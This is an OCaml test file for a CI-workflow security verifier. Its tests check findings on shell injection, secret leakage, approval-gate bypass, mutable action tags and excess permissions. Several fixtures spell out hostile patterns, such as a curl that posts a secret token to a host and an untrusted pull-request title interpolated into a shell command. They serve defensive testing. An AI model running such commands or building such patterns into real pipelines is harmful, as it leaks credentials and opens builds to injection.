type test = string * (unit -> unit)

exception Failed of string

let fail format = Printf.ksprintf (fun value -> raise (Failed value)) format
let expect message condition = if not condition then fail "%s" message

let value ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public)
    text =
  Abstract_value.string_constant text ~trust ~secrecy
    ~provenance:[ { origin = "fixture"; span = Span.none; operation = "test" } ]

let node ?(kind = Ir.Command) ?(phase = Ir.Run) ?(attributes = [])
    ?(capabilities = []) ?(effects = []) ?unknown name =
  Ir.make_node ~provider:Ir.Github ~kind ~name ~phase ~span:Span.none
    ~attributes ~capabilities ~effects ?unknown ()

let graph (nodes : Ir.node list) (edges : Ir.edge list)
    (entrypoints : Ir.node list) =
  List.fold_left
    (fun graph (node : Ir.node) -> Ir.add_node node graph)
    (Ir.empty Ir.Github "fixture.yml")
    nodes
  |> fun graph ->
  List.fold_left (fun graph edge -> Ir.add_edge edge graph) graph edges
  |> fun graph ->
  List.fold_left
    (fun graph (node : Ir.node) -> Ir.add_entrypoint node.id graph)
    graph entrypoints
  |> Ir.finalize

let edge ?(kind = Ir.Control) (from_ : Ir.node) (to_ : Ir.node) =
  Ir.make_edge ~kind ~from_:from_.id ~to_:to_.id ()

let has_rule rule result =
  List.exists
    (fun diagnostic -> diagnostic.Diagnostic.rule_id = rule)
    result.Verifier.diagnostics

let property rule result =
  match
    List.find_opt
      (fun property -> property.Property.id = rule)
      result.Verifier.properties
  with
  | Some value -> value
  | None -> fail "missing property %s" rule

let injection_triple_test () =
  let unsafe_command =
    node
      ~attributes:
        [
          ( "command",
            value ~trust:Abstract_value.Untrusted
              "echo ${{ github.event.pull_request.title }}" );
        ]
      ~capabilities:[ Ir.Shell ] "unsafe shell"
  in
  let unsafe_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ unsafe_command ] [] [ unsafe_command ])
  in
  expect "untrusted command interpolation must violate injection property"
    ((property "WV-SEC-001" unsafe_result).state = Property.Violated);
  expect "violation must emit a diagnostic"
    (has_rule "WV-SEC-001" unsafe_result);
  let diagnostic =
    List.find
      (fun item -> item.Diagnostic.rule_id = "WV-SEC-001")
      unsafe_result.diagnostics
  in
  expect "diagnostic needs a source-to-command trace" (diagnostic.trace <> []);
  expect "a directly tainted command is labelled as the contained sink"
    (List.exists
       (fun hop -> hop.Diagnostic.label = "command sink contains untrusted data")
       diagnostic.trace);
  expect "shell is part of the minimal exploit capability set"
    (List.mem Ir.Shell diagnostic.capabilities);

  let safe_command =
    node
      ~attributes:[ ("command", value "printf '%s' \"$TITLE\"") ]
      ~capabilities:[ Ir.Shell ] "quoted env"
  in
  let safe_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ safe_command ] [] [ safe_command ])
  in
  expect "trusted command must prove injection property"
    ((property "WV-SEC-001" safe_result).state = Property.Proved);

  let unknown_command =
    node
      ~attributes:
        [
          ( "command",
            Abstract_value.unknown (Unknown.Dynamic_string "generated script")
          );
        ]
      ~capabilities:[ Ir.Shell ] "dynamic shell"
  in
  let unknown_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ unknown_command ] [] [ unknown_command ])
  in
  (match (property "WV-SEC-001" unknown_result).state with
  | Property.Unknown reasons ->
      expect "Unknown must retain a reason" (reasons <> [])
  | _ -> fail "dynamic command must remain Unknown");
  let value_reason = Unknown.Dynamic_string "value-only dynamic script" in
  let value_only_unknown : Abstract_value.t =
    {
      value_type = Abstract_value.Dynamic_type;
      value = Abstract_value.Unknown_value [ value_reason ];
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let value_only_command =
    node ~attributes:[ ("command", value_only_unknown) ]
      ~capabilities:[ Ir.Shell ] "value-only dynamic shell"
  in
  let value_only_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ value_only_command ] [] [ value_only_command ])
  in
  expect "value-level uncertainty survives known trust and secrecy"
    (match (property "WV-SEC-001" value_only_result).state with
    | Property.Unknown reasons -> List.mem value_reason reasons
    | _ -> false)

let injection_environment_binding_test () =
  let source =
    node ~kind:Ir.Resource
      ~attributes:[ ("value", value ~trust:Abstract_value.Untrusted "input") ]
      "inputs.title"
  and binding = node ~kind:Ir.Resource "env:TITLE"
  and safe_command =
    node
      ~attributes:
        [ ("command", value "STAMP=$(date)\nprintf '%s' \"$TITLE\"\n") ]
      ~capabilities:[ Ir.Shell ] "safe environment boundary"
  in
  let safe =
    graph
      [ source; binding; safe_command ]
      [
        edge ~kind:Ir.Data source binding;
        edge ~kind:Ir.Data binding safe_command;
      ]
      [ safe_command ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "quoted environment binding isolates the untrusted value"
    (not (has_rule "WV-SEC-001" safe));
  let unrelated_command =
    node
      ~attributes:[ ("command", value "printf '%s' $TITLE_SUFFIX") ]
      ~capabilities:[ Ir.Shell ] "unrelated environment expansion"
  in
  let unrelated =
    graph
      [ source; binding; unrelated_command ]
      [
        edge ~kind:Ir.Data source binding;
        edge ~kind:Ir.Data binding unrelated_command;
      ]
      [ unrelated_command ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "environment names match complete shell identifiers"
    (not (has_rule "WV-SEC-001" unrelated));
  let unsafe_command =
    node
      ~attributes:[ ("command", value "printf '%s' $TITLE") ]
      ~capabilities:[ Ir.Shell ] "unsafe environment boundary"
  in
  let unsafe_graph =
    graph
      [ source; binding; unsafe_command ]
      [
        edge ~kind:Ir.Data source binding;
        edge ~kind:Ir.Data binding unsafe_command;
      ]
      [ unsafe_command ]
  in
  let unsafe_solution = Dataflow.solve unsafe_graph in
  expect "environment data edge propagates untrusted input"
    (Abstract_value.is_untrusted
       (Dataflow.value_at unsafe_solution unsafe_command.id));
  let unsafe_summary =
    Script_adapter.analyze Script_adapter.Bash "printf '%s' $TITLE"
  in
  expect "script adapter retains the unquoted environment expansion"
    (List.exists
       (fun (expansion : Script_adapter.expansion) ->
         expansion.expansion_text = "$TITLE" && not expansion.expansion_quoted)
       unsafe_summary.expansions);
  let unsafe = Verifier.verify ~persona:Verifier.Gate unsafe_graph in
  expect "unquoted environment binding remains an injection boundary"
    (has_rule "WV-SEC-001" unsafe)

let secret_network_test () =
  let command =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "curl -d $TOKEN https://example.invalid" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Network; Ir.Secret_access ]
      "upload"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate (graph [ command ] [] [ command ])
  in
  expect "secret sent by a network command must be found"
    (has_rule "WV-SEC-002" result);
  let finding =
    List.find
      (fun item -> item.Diagnostic.rule_id = "WV-SEC-002")
      result.diagnostics
  in
  expect "minimal set includes network and secret access"
    (List.mem Ir.Network finding.capabilities
    && List.mem Ir.Secret_access finding.capabilities)

let unknown_secret_network_effect_test () =
  let reason = Unknown.External_state "runtime credential classification" in
  let uncertain =
    {
      Abstract_value.value_type = Dynamic_type;
      value = String Top;
      trust = Trusted;
      secrecy = Unknown_secrecy [ reason ];
      provenance = [];
    }
  in
  let network_effect =
    node ~kind:Ir.Effect ~attributes:[ ("payload", uncertain) ]
      ~capabilities:[ Ir.Network ] ~effects:[ Ir.Network_request ]
      "opaque network effect"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ network_effect ] [] [ network_effect ])
  in
  expect "an observable value with unknown secrecy stays Unknown"
    (match (property "WV-SEC-002" result).state with
    | Property.Unknown reasons -> List.mem reason reasons
    | _ -> false)

let network_capability_uncertainty_test () =
  let reason = Unknown.External_state "opaque network-capable implementation" in
  let opaque =
    node ~unknown:reason
      ~attributes:[ ("command", value "write private state") ]
      ~capabilities:[ Ir.Shell; Ir.Network ] "opaque network-capable command"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate (graph [ opaque ] [] [ opaque ])
  in
  expect "uncertainty on a network-capable sink remains explicit"
    (match (property "WV-SEC-002" result).state with
    | Property.Unknown reasons -> List.mem reason reasons
    | _ -> false)

let secret_observability_boundaries_test () =
  let redirected =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "echo \"$NPM_TOKEN\" > ~/.npmrc" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Filesystem_write ]
      "write npm config"
  in
  let redirected_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ redirected ] [] [ redirected ])
  in
  expect "redirecting a secret to a file is not a log exfiltration"
    (not (has_rule "WV-SEC-002" redirected_result));
  let piped =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "printf '%s' \"$NPM_TOKEN\" | base64" );
        ]
      ~capabilities:[ Ir.Shell ] "pipe secret to stdout"
  in
  let piped_result =
    Verifier.verify ~persona:Verifier.Gate (graph [ piped ] [] [ piped ])
  in
  expect "a pipe whose output remains on stdout is observable"
    (has_rule "WV-SEC-002" piped_result);
  let piped_to_file =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "printf '%s' \"$NPM_TOKEN\" | base64 > private.enc" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Filesystem_write ]
      "pipe secret to file"
  in
  let piped_to_file_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ piped_to_file ] [] [ piped_to_file ])
  in
  expect "a pipeline redirected to a constant private file is not a log leak"
    (not (has_rule "WV-SEC-002" piped_to_file_result));
  let dynamic_redirect =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "printf '%s' \"$NPM_TOKEN\" > $DESTINATION_FILE" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Filesystem_write ]
      "pipe secret to dynamic file"
  in
  let dynamic_redirect_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ dynamic_redirect ] [] [ dynamic_redirect ])
  in
  expect "a dynamic redirect target is Unknown rather than a log violation"
    ((not (has_rule "WV-SEC-002" dynamic_redirect_result))
    &&
    match (property "WV-SEC-002" dynamic_redirect_result).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false);
  let credential_pipe =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "echo \"$REGISTRY_PASSWORD\" | docker login registry.example \
               --password-stdin" );
        ]
      ~capabilities:[ Ir.Shell; Ir.Network; Ir.Secret_access ]
      "registry login"
  in
  let credential_pipe_result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ credential_pipe ] [] [ credential_pipe ])
  in
  let credential_finding =
    List.find
      (fun item -> item.Diagnostic.rule_id = "WV-SEC-002")
      credential_pipe_result.diagnostics
  in
  expect "a password-stdin consumer is a network sink, not stdout"
    (List.mem Ir.Network credential_finding.capabilities);
  let literal =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret
              "echo 'Verify token permissions'" );
        ]
      ~capabilities:[ Ir.Shell ] "literal security guidance"
  in
  let literal_result =
    Verifier.verify ~persona:Verifier.Gate (graph [ literal ] [] [ literal ])
  in
  expect "a literal security word is not a secret variable reference"
    (not (has_rule "WV-SEC-002" literal_result));
  let remote =
    node ~kind:Ir.Call ~phase:Ir.Run
      ~attributes:
        [
          ( "credential",
            value ~secrecy:Abstract_value.Secret "secrets.DEPLOY_TOKEN" );
        ]
      ~capabilities:[ Ir.Network; Ir.Secret_access ]
      ~unknown:(Unknown.Unresolved_dependency "owner/action@v1")
      "owner/action@v1"
  in
  let remote_result =
    Verifier.verify ~persona:Verifier.Gate (graph [ remote ] [] [ remote ])
  in
  expect "an unresolved network-capable action remains Unknown, not violated"
    (not (has_rule "WV-SEC-002" remote_result));
  expect "unresolved action observability retains its reason"
    (match (property "WV-SEC-002" remote_result).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false)

let dominance_test () =
  let workflow = node ~kind:Ir.Workflow ~phase:Ir.Compile "workflow"
  and gate = node ~kind:Ir.Gate ~phase:Ir.Plan "environment approval"
  and deploy =
    node ~kind:Ir.Effect ~effects:[ Ir.Deployment_change ]
      ~capabilities:[ Ir.Deployment ] "deploy"
  in
  let safe =
    graph [ workflow; gate; deploy ]
      [ edge workflow gate; edge gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "approval gate dominates deployment"
    ((property "WV-AUTH-001" safe).state = Property.Proved);
  let bypass_first = node ~kind:Ir.Step "bypass first"
  and bypass_second = node ~kind:Ir.Step "bypass second" in
  let bypass =
    graph [ workflow; gate; bypass_first; bypass_second; deploy ]
      [
        edge workflow gate;
        edge gate deploy;
        edge workflow bypass_first;
        edge bypass_first bypass_second;
        edge bypass_second deploy;
      ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "a bypass path violates authorization dominance"
    ((property "WV-AUTH-001" bypass).state = Property.Violated);
  expect "bypass produces a deterministic witness"
    (has_rule "WV-AUTH-001" bypass);
  let witness =
    List.find
      (fun diagnostic -> diagnostic.Diagnostic.rule_id = "WV-AUTH-001")
      bypass.diagnostics
  in
  expect "the witness excludes the trusted gate and follows the real bypass"
    (List.exists
       (fun (hop : Diagnostic.trace_hop) -> hop.node_id = bypass_first.id)
       witness.trace
    && List.exists
         (fun (hop : Diagnostic.trace_hop) -> hop.node_id = bypass_second.id)
         witness.trace
    && not
         (List.exists
            (fun (hop : Diagnostic.trace_hop) -> hop.node_id = gate.id)
            witness.trace))

let authorization_unknown_and_manual_test () =
  let workflow = node ~kind:Ir.Workflow ~phase:Ir.Compile "workflow"
  and deploy =
    node ~kind:Ir.Effect ~effects:[ Ir.Deployment_change ]
      ~capabilities:[ Ir.Deployment ] "deploy"
  and environment =
    node ~kind:Ir.Resource ~phase:Ir.Plan
      ~unknown:(Unknown.External_state "environment protection rules")
      "environment:production"
  in
  let external_result =
    graph
      [ workflow; deploy; environment ]
      [ edge workflow deploy; edge ~kind:Ir.Grant environment deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "unobserved environment protection keeps authorization Unknown"
    (match (property "WV-AUTH-001" external_result).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false);
  expect "external protection uncertainty is not a definite bypass"
    (not (has_rule "WV-AUTH-001" external_result));
  let unknown_gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~unknown:(Unknown.External_state "reviewer decision")
      "environment approval"
  in
  let uncertain =
    graph
      [ workflow; unknown_gate; deploy ]
      [ edge workflow unknown_gate; edge unknown_gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "an Unknown gate cannot prove authorization"
    (match (property "WV-AUTH-001" uncertain).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false);
  let manual_source =
    {|stages: [deploy]
release:
  stage: deploy
  when: manual
  environment: production
  script: kubectl apply -f deployment.yml
|}
  in
  let manual =
    match
      Frontend.compile_string ~provider:Ir.Gitlab ~path:".gitlab-ci.yml"
        ~source:manual_source ()
    with
    | Ok compilation -> Verifier.verify ~persona:Verifier.Gate compilation.graph
    | Error _ -> fail "GitLab manual authorization fixture did not compile"
  in
  expect "GitLab manual execution is an explicit dominating approval gate"
    ((property "WV-AUTH-001" manual).state = Property.Proved)

let supply_chain_and_permission_test () =
  let workflow =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Ir.Token_write ]
      "workflow"
  and call =
    node ~kind:Ir.Call ~phase:Ir.Run
      ~unknown:(Unknown.Unresolved_dependency "actions/checkout@v4")
      "actions/checkout@v4"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ workflow; call ] [ edge workflow call ] [ workflow ])
  in
  expect "mutable action tag must be diagnosed"
    (has_rule "WV-SUPPLY-001" result);
  expect "an unresolved action cannot prove a write grant excessive"
    (not (has_rule "WV-PERM-001" result));
  expect "unresolved grant demand remains Unknown"
    (match (property "WV-PERM-001" result).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false)

let known_excessive_permission_test () =
  let workflow =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Ir.Token_write ]
      "workflow"
  and command =
    node ~effects:[ Ir.Command_execution ] ~capabilities:[ Ir.Shell ]
      "echo safe"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ workflow; command ] [ edge workflow command ] [ workflow ])
  in
  expect "a closed graph proves unrelated write grants excessive"
    (has_rule "WV-PERM-001" result)

let command_attribute_consumes_permission_test () =
  let workflow =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write ] "workflow"
  and command =
    node
      ~attributes:[ ("command", value "gh release create v1 dist/app") ]
      ~capabilities:[ Ir.Shell ] "publish release"
  in
  let result =
    Verifier.verify ~persona:Verifier.Gate
      (graph [ workflow; command ] [ edge workflow command ] [ workflow ])
  in
  expect "least privilege analyzes the command source rather than its label"
    (not (has_rule "WV-PERM-001" result));
  expect "a repository write sink consumes the declared grant"
    ((property "WV-PERM-001" result).state = Property.Proved)

let inherent_execution_capabilities_are_not_reducible_grants_test () =
  let workflow = node ~kind:Ir.Workflow ~phase:Ir.Compile "workflow"
  and command =
    node
      ~capabilities:[ Ir.Filesystem_write; Ir.Network; Ir.Shell ]
      ~effects:[ Ir.Command_execution ] "echo safe"
  and action =
    node ~kind:Ir.Call
      ~capabilities:[ Ir.Network; Ir.Filesystem_write ]
      "immutable action"
  in
  let result =
    Verifier.verify ~persona:Verifier.Audit
      (graph
         [ workflow; command; action ]
         [ edge workflow command; edge command action ]
         [ workflow ])
  in
  expect "runner and action requirements are not removable permission grants"
    (not (has_rule "WV-PERM-001" result));
  expect "a graph without declared grants is not a least-privilege subject"
    ((property "WV-PERM-001" result).state = Property.Not_applicable)

let script_adapter_test () =
  let named_command = node "curl https://example.invalid" in
  expect "a command node without a command attribute uses its semantic name"
    (Script_adapter.command_source named_command = "curl https://example.invalid");
  expect "node-name fallback participates in effect inference"
    (List.mem Ir.Network_request
       (Script_adapter.analyze_node named_command).effects);
  let unknown_command =
    node ~attributes:[ ("command", Abstract_value.bottom) ]
      "curl https://fallback.invalid"
  in
  expect "a non-finite command value falls back to the semantic node name"
    (Script_adapter.command_source unknown_command
    = "curl https://fallback.invalid");
  let empty_commands : Abstract_value.t =
    {
      value_type = Abstract_value.String_type;
      value = Abstract_value.String (Abstract_value.Constants []);
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let empty_command =
    node ~attributes:[ ("command", empty_commands) ] "echo fallback"
  in
  expect "an empty finite command set falls back to the semantic node name"
    (Script_adapter.command_source empty_command = "echo fallback");
  let cases =
    [
      (Script_adapter.Bash, "curl https://example.invalid");
      (Script_adapter.PowerShell, "Invoke-WebRequest https://example.invalid");
      (Script_adapter.Cmd, "curl.exe https://example.invalid");
      (Script_adapter.Python, "requests.post(url, data=token)");
    ]
  in
  List.iter
    (fun (shell, source) ->
      let summary = Script_adapter.analyze shell source in
      expect "network effect must be recognized across script adapters"
        (List.mem Ir.Network_request summary.effects))
    cases;
  let quoted =
    Script_adapter.analyze Script_adapter.Bash "printf '%s' \"$TITLE\""
  in
  expect "tokenizer must retain quoted expansion context"
    (List.exists (fun token -> token.Script_adapter.quoted) quoted.tokens);
  let sparse = Script_adapter.analyze Script_adapter.Bash "  echo   ok  " in
  expect "tokenizer must not materialize whitespace as empty tokens"
    (List.map
       (fun (token : Script_adapter.token) ->
         (token.text, token.quoted, token.start, token.stop))
       sparse.tokens
    = [ ("echo", false, 2, 6); ("ok", false, 9, 11) ]);
  let after_empty_quote =
    Script_adapter.analyze Script_adapter.Bash "\"\" word"
  in
  expect "an empty quoted token cannot mark the following word as quoted"
    (match after_empty_quote.tokens with
    | [ token ] ->
        token.text = "word" && (not token.quoted) && token.start = 3
        && token.stop = 7
    | _ -> false);
  let nested_substitution =
    Script_adapter.analyze Script_adapter.Bash
      "printf '%s' \"$TOKEN\" $(printf $(value) > private.log)"
  in
  expect "nested substitution redirection does not hide outer secret output"
    nested_substitution.secret_to_output;
  let redirected_after_substitution =
    Script_adapter.analyze Script_adapter.Bash
      {|printf '%s' "$TOKEN" $(safe) > private.log|}
  in
  expect
    "a closed substitution restores the following private redirection boundary"
    (not redirected_after_substitution.secret_to_output);
  let redirected_after_escaped_quote =
    Script_adapter.analyze Script_adapter.Bash
      {|printf '%s' "$TOKEN" "escaped\" quote" > private.log|}
  in
  expect "an escaped quote cannot hide a following private redirection"
    (not redirected_after_escaped_quote.secret_to_output);
  let quoted_subshell_command =
    Script_adapter.analyze Script_adapter.Bash
      {|("sh" -c 'echo $TOKEN'); printf safe > private.log|}
  in
  expect
    "a quoted command name inside a subshell preserves the following sequence boundary"
    quoted_subshell_command.secret_to_output;
  let unterminated_quote =
    Script_adapter.analyze Script_adapter.Bash "token\""
  in
  expect "an opening quote at the token boundary remains observable"
    (List.exists
       (fun (token : Script_adapter.token) -> token.quoted)
       unterminated_quote.tokens);
  let nested_group =
    Script_adapter.analyze Script_adapter.Bash
      "printf safe $(printf $(value); echo $TOKEN > private.log)"
  in
  expect "nested substitutions keep separators and redirects in their group"
    nested_group.secret_to_output;
  let grouped_private_output =
    Script_adapter.analyze Script_adapter.Bash
      "(echo $TOKEN; printf safe) > private.log"
  in
  expect "a leading group binds its secret output to the outer private redirect"
    (not grouped_private_output.secret_to_output);
  let closed_substitution =
    Script_adapter.analyze Script_adapter.Bash
      "echo $TOKEN $(value);printf safe > private.log"
  in
  expect "a closing substitution restores the following separator boundary"
    closed_substitution.secret_to_output;
  let closed_quote =
    Script_adapter.analyze Script_adapter.Bash
      "echo $TOKEN\"\";printf safe > private.log"
  in
  expect "a closing quote restores the following separator boundary"
    closed_quote.secret_to_output;
  let escaped_quote_context =
    Script_adapter.analyze Script_adapter.Bash
      "echo \"$TOKEN\" \"abc\\x > private.log\""
  in
  expect "a backslash keeps the following byte inside its double quote"
    escaped_quote_context.secret_to_output;
  let separator_quote_context =
    Script_adapter.analyze Script_adapter.Bash
      "printf safe;\"echo $TOKEN; literal\" > private.log"
  in
  expect "a separator begins the next quoted group without leaked escape state"
    (not separator_quote_context.secret_to_output);
  let empty_target =
    Script_adapter.analyze Script_adapter.Bash "echo $TOKEN > \"\""
  in
  expect "an empty quoted redirect target remains observable output"
    empty_target.secret_to_output;
  let empty_argument_before_redirect =
    Script_adapter.analyze Script_adapter.Bash
      "echo \"$TOKEN\" \"\" > private.log"
  in
  expect "an empty quoted argument closes before a following redirect"
    (not empty_argument_before_redirect.secret_to_output);
  let unquoted_secret_before_empty_argument =
    Script_adapter.analyze Script_adapter.Bash
      "echo $TOKEN \"\" > private.log"
  in
  expect "an empty quote cannot hide the redirect that follows it"
    (not unquoted_secret_before_empty_argument.secret_to_output);
  let lone_cmd_marker = Script_adapter.analyze Script_adapter.Cmd "%" in
  expect "a lone cmd marker is not an environment expansion"
    (lone_cmd_marker.expansions = []);
  let empty_pipeline = Script_adapter.analyze Script_adapter.Bash "|" in
  expect "an empty pipeline has no observable secret flow"
    ((not empty_pipeline.secret_to_output)
    && not empty_pipeline.secret_to_network);
  let tied_commands : Abstract_value.t =
    {
      value_type = Abstract_value.String_type;
      value =
        Abstract_value.String (Abstract_value.Constants [ "curl x"; "echo x" ]);
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let tied =
    node ~attributes:[ ("command", tied_commands) ] "fallback"
    |> Script_adapter.analyze_node
  in
  expect "equal-length command alternatives retain canonical first choice"
    (List.mem Ir.Network_request tied.effects)

let disconnected_capability_demand_test () =
  let grant =
    node ~kind:Ir.Workflow ~phase:Ir.Compile ~capabilities:[ Ir.Network ]
      "network grant"
  and disconnected =
    node ~kind:Ir.Effect ~effects:[ Ir.Network_request ] "disconnected network"
  in
  match
    Capability_analysis.grant_demands
      (graph [ grant; disconnected ] [] [ grant ])
  with
  | [ ((owner, Ir.Network), Capability_analysis.Excessive) ] ->
      expect "demand owner remains the declared grant" (owner.id = grant.id)
  | _ -> fail "a disconnected effect must not justify a capability grant"

let dynamic_gate_mechanism_test () =
  let workflow = node ~kind:Ir.Workflow ~phase:Ir.Compile "workflow"
  and mechanism : Abstract_value.t =
    {
      value_type = Abstract_value.String_type;
      value = Abstract_value.String Abstract_value.Top;
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan ~attributes:[ ("mechanism", mechanism) ]
      "dynamic mechanism"
  and deploy =
    node ~kind:Ir.Effect ~effects:[ Ir.Deployment_change ]
      ~capabilities:[ Ir.Deployment ] "deploy"
  in
  let result =
    graph [ workflow; gate; deploy ]
      [ edge workflow gate; edge gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "a dynamic mechanism cannot be promoted to an authorization gate"
    ((property "WV-AUTH-001" result).state = Property.Violated);
  let conditional_gate =
    {
      (node ~kind:Ir.Gate ~phase:Ir.Plan "branch condition") with
      condition = Condition.atom "branch-is-main";
    }
  in
  let conditional =
    graph [ workflow; conditional_gate; deploy ]
      [ edge workflow conditional_gate; edge conditional_gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "an unrelated condition is not a protected-reference gate"
    ((property "WV-AUTH-001" conditional).state = Property.Violated);
  let uncertain_gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~attributes:
        [
          ("mechanism", value "approval");
          ( "external",
            Abstract_value.unknown (Unknown.External_state "review state") );
        ]
      "uncertain approval"
  in
  let uncertain =
    graph [ workflow; uncertain_gate; deploy ]
      [ edge workflow uncertain_gate; edge uncertain_gate deploy ]
      [ workflow ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "Unknown gate values retain their evidence reasons"
    (match (property "WV-AUTH-001" uncertain).state with
    | Property.Unknown reasons -> reasons <> []
    | _ -> false)

let credential_candidate_boundaries_test () =
  let secret =
    node
      ~attributes:
        [
          ( "credential",
            value ~secrecy:Abstract_value.Secret "TOKEN" );
        ]
      "secret source"
  and benign_call = node ~kind:Ir.Call "benign call"
  and unrelated_writer = node ~kind:Ir.Step "unrelated writer"
  and tail = node ~kind:Ir.Resource "runner state" in
  let disconnected =
    graph [ secret; benign_call; unrelated_writer; tail ]
      [
        edge ~kind:Ir.Data secret benign_call;
        edge ~kind:Ir.Persist unrelated_writer tail;
      ]
      [ secret; unrelated_writer ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "an unrelated persist edge cannot turn another call into a candidate"
    ((property "WV-CRED-001" disconnected).state = Property.Not_applicable);
  let safe_candidate =
    node ~kind:Ir.Call ~capabilities:[ Ir.Self_hosted_persistence ]
      "safe persistent call"
  in
  let safe =
    graph [ safe_candidate ] [] [ safe_candidate ]
    |> Verifier.verify ~persona:Verifier.Gate
  in
  expect "a known-public persistence candidate proves credential safety"
    ((property "WV-CRED-001" safe).state = Property.Proved)

let graph_algorithm_boundaries_test () =
  let root = { (node "root") with id = "a-root" }
  and left = { (node "left") with id = "b-left" }
  and right = { (node "right") with id = "c-right" }
  and merge = { (node "merge") with id = "d-merge" } in
  let diamond =
    graph [ root; left; right; merge ]
      [
        edge root left;
        edge root right;
        edge left merge;
        edge right merge;
      ]
      [ root ]
  in
  expect "neither branch of a diamond dominates its merge"
    (not (Graph_algorithms.dominates diamond ~dominator:left.id ~node:merge.id)
    && not
         (Graph_algorithms.dominates diamond ~dominator:right.id ~node:merge.id));
  let penultimate = { (node "penultimate") with id = "e-penultimate" }
  and target = { (node "target") with id = "f-target" } in
  let converging =
    graph [ root; left; right; merge; penultimate; target ]
      [
        edge root left;
        edge root right;
        edge left merge;
        edge right merge;
        edge merge penultimate;
        edge penultimate target;
      ]
      [ root ]
  in
  expect "shortest-path search visits a diamond merge only once"
    (match Graph_algorithms.shortest_path converging root.id target.id with
    | Some path ->
        List.length path = 5
        && List.hd path = root
        && List.hd (List.rev path) = target
    | None -> false);
  let cycle_root = { (node "cycle root") with id = "a-cycle-root" }
  and cycle_a = { (node "cycle a") with id = "b-cycle-a" }
  and cycle_b = { (node "cycle b") with id = "c-cycle-b" } in
  let cyclic =
    let isolated = { (node "isolated") with id = "z-isolated" } in
    let graph =
      graph [ cycle_root; cycle_a; cycle_b; isolated ]
      [ edge cycle_root cycle_a; edge cycle_a cycle_b; edge cycle_b cycle_a ]
      [ cycle_root ]
    in
    expect "shortest-path search terminates when a cyclic target is unreachable"
      (Graph_algorithms.shortest_path graph cycle_root.id isolated.id = None);
    graph
  in
  match Graph_algorithms.control_cycles cyclic with
  | [ cycle ] ->
      expect "cycle witnesses exclude the acyclic path prefix"
        (List.mem cycle_a.id cycle && List.mem cycle_b.id cycle
        && not (List.mem cycle_root.id cycle))
  | cycles -> fail "expected one control cycle, found %d" (List.length cycles)

let dataflow_order_test () =
  let ids =
    [
      "zeta";
      "alpha";
      "theta";
      "beta";
      "lambda";
      "gamma";
      "omega";
      "delta";
      "kappa";
      "epsilon";
      "sigma";
      "eta";
    ]
  in
  let nodes =
    List.map (fun id -> { (node ("node " ^ id)) with id }) ids
  in
  let solution = Dataflow.solve (graph (List.rev nodes) [] nodes) in
  expect "dataflow evidence follows canonical node identity order"
    (List.map fst solution.values = List.sort String.compare ids)

let property_order_test () =
  let property ?(id = "ORDER") ?(subject = None) ?(explanation = "same") state :
      Property.t =
    { id; state; subject; explanation }
  in
  let states =
    [
      Property.Proved;
      Property.Violated;
      Property.Unknown [ Unknown.External_state "fixture" ];
      Property.Not_applicable;
    ]
  in
  List.iteri
    (fun left_index left ->
      List.iteri
        (fun right_index right ->
          let actual = Property.compare (property left) (property right) in
          expect
